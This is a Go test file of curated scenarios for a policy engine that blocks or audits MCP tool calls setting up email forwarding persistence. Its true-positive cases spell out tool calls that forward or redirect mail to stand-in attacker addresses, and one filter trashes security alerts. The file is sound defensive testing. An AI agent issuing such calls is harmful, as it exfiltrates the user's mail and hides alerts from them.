// Curated MCP scenarios for issue #1541: email forwarding persistence rules.
// Tests mcp-persist-block-email-auto-forward-enable,
// mcp-persist-block-email-filter-forward,
// mcp-persist-block-email-outlook-rule-forward, and
// mcp-persist-audit-email-filter-create in mcp-persistence.yaml.

package scenarios

// EmailForwardScenarios contains TP and TN test scenarios for email
// forwarding persistence rules (premium/mcp/mcp-persistence.yaml, issue #1541).
var EmailForwardScenarios = []Scenario{

	// ── mcp-persist-block-email-auto-forward-enable ──────────────────────────

	{
		ID:               "MCP-TP-1541-001",
		ToolName:         "enable_auto_forwarding",
		Arguments:        map[string]interface{}{"forwardingEmail": "attacker@evil.com", "enabled": true},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "Gmail enable_auto_forwarding with attacker email — must BLOCK",
	},
	{
		ID:               "MCP-TP-1541-002",
		ToolName:         "update_auto_forwarding",
		Arguments:        map[string]interface{}{"emailAddress": "exfil@attacker.com", "enabled": true, "disposition": "leaveInInbox"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "Gmail update_auto_forwarding — must BLOCK",
	},
	{
		ID:               "MCP-TP-1541-003",
		ToolName:         "set_forwarding",
		Arguments:        map[string]interface{}{"destination": "exfil@attacker.com", "enabled": true},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "Generic set_forwarding — must BLOCK",
	},
	{
		ID:               "MCP-TP-1541-004",
		ToolName:         "enable_email_forwarding",
		Arguments:        map[string]interface{}{"address": "steal@evil.com"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "Generic enable_email_forwarding — must BLOCK",
	},
	{
		ID:               "MCP-TN-1541-001",
		ToolName:         "get_forwarding_settings",
		Arguments:        map[string]interface{}{},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "Reading forwarding settings (read-only) — must not BLOCK",
	},
	{
		ID:               "MCP-TN-1541-002",
		ToolName:         "list_forwarding_addresses",
		Arguments:        map[string]interface{}{},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-auto-forward-enable",
		Description:      "List forwarding addresses (read-only) — must not BLOCK",
	},

	// ── mcp-persist-block-email-filter-forward ───────────────────────────────

	{
		ID:       "MCP-TP-1541-005",
		ToolName: "gmail_create_filter",
		Arguments: map[string]interface{}{
			"criteria": map[string]interface{}{"from": "*@company.com"},
			"action":   map[string]interface{}{"forward": "attacker@evil.com"},
		},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-filter-forward",
		Description:      "Gmail filter with forward action to attacker email — must BLOCK",
	},
	{
		ID:       "MCP-TP-1541-006",
		ToolName: "create_filter",
		Arguments: map[string]interface{}{
			"query":  "from:hr@company.com",
			"action": map[string]interface{}{"forward": "exfil@attacker.com", "addLabelIds": []string{}},
		},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-filter-forward",
		Description:      "Generic create_filter with forward action — must BLOCK",
	},
	{
		ID:       "MCP-TN-1541-003",
		ToolName: "gmail_create_filter",
		Arguments: map[string]interface{}{
			"criteria": map[string]interface{}{"hasAttachment": true},
			"action":   map[string]interface{}{"addLabelIds": []string{"Label_Attachments"}, "removeLabelIds": []string{"INBOX"}},
		},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-filter-forward",
		Description:      "Gmail filter that adds label (no forwarding) — must not BLOCK",
	},
	{
		ID:       "MCP-TN-1541-004",
		ToolName: "gmail_create_filter",
		Arguments: map[string]interface{}{
			"criteria": map[string]interface{}{"subject": "invoice"},
			"action":   map[string]interface{}{"addLabelIds": []string{"Label_Forward-Review"}, "markAsRead": true},
		},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-filter-forward",
		Description:      "Gmail filter with label named 'Forward-Review' (no actual forwarding) — must not BLOCK",
	},

	// ── mcp-persist-block-email-outlook-rule-forward ─────────────────────────

	{
		ID:       "MCP-TP-1541-007",
		ToolName: "create_inbox_rule",
		Arguments: map[string]interface{}{
			"displayName": "Forward security alerts",
			"actions": map[string]interface{}{
				"forwardTo": []interface{}{
					map[string]interface{}{"emailAddress": map[string]interface{}{"address": "attacker@evil.com", "name": "Attacker"}},
				},
			},
			"conditions": map[string]interface{}{"senderContains": []string{"security@bank.com"}},
		},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-outlook-rule-forward",
		Description:      "Outlook inbox rule with forwardTo action — must BLOCK",
	},
	{
		ID:       "MCP-TP-1541-008",
		ToolName: "update_inbox_rule",
		Arguments: map[string]interface{}{
			"id": "rule_123",
			"actions": map[string]interface{}{
				"redirectTo": []interface{}{
					map[string]interface{}{"emailAddress": map[string]interface{}{"address": "exfil@attacker.com"}},
				},
			},
		},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-persist-block-email-outlook-rule-forward",
		Description:      "Outlook inbox rule with redirectTo action — must BLOCK",
	},
	{
		ID:       "MCP-TN-1541-005",
		ToolName: "create_inbox_rule",
		Arguments: map[string]interface{}{
			"displayName": "Move newsletters",
			"actions":     map[string]interface{}{"moveToFolder": "Newsletters", "markAsRead": true},
			"conditions":  map[string]interface{}{"senderContains": []string{"newsletter@"}},
		},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-outlook-rule-forward",
		Description:      "Outlook inbox rule that moves to folder (no forwarding) — must not BLOCK",
	},
	{
		ID:               "MCP-TN-1541-006",
		ToolName:         "list_inbox_rules",
		Arguments:        map[string]interface{}{},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-block-email-outlook-rule-forward",
		Description:      "List inbox rules (read-only) — must not BLOCK",
	},

	// ── mcp-persist-audit-email-filter-create ────────────────────────────────

	{
		ID:       "MCP-TP-1541-009",
		ToolName: "gmail_create_filter",
		Arguments: map[string]interface{}{
			"criteria": map[string]interface{}{"from": "security-alerts@company.com"},
			"action":   map[string]interface{}{"addLabelIds": []string{"TRASH"}},
		},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-persist-audit-email-filter-create",
		Description:      "Gmail filter moving security alerts to trash — must AUDIT (alert suppression)",
	},
	{
		ID:       "MCP-TP-1541-010",
		ToolName: "create_inbox_rule",
		Arguments: map[string]interface{}{
			"displayName": "Archive HR emails",
			"actions":     map[string]interface{}{"moveToFolder": "Archive", "markAsRead": true},
		},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-persist-audit-email-filter-create",
		Description:      "Generic inbox rule creation (no forwarding) — must AUDIT",
	},
	{
		ID:               "MCP-TN-1541-007",
		ToolName:         "list_filters",
		Arguments:        map[string]interface{}{},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-audit-email-filter-create",
		Description:      "List filters (read-only) — must not trigger write AUDIT rules",
	},
	{
		ID:               "MCP-TN-1541-008",
		ToolName:         "get_filter",
		Arguments:        map[string]interface{}{"id": "filter_123"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-persist-audit-email-filter-create",
		Description:      "Get filter by ID (read-only) — must not trigger write AUDIT rules",
	},
}
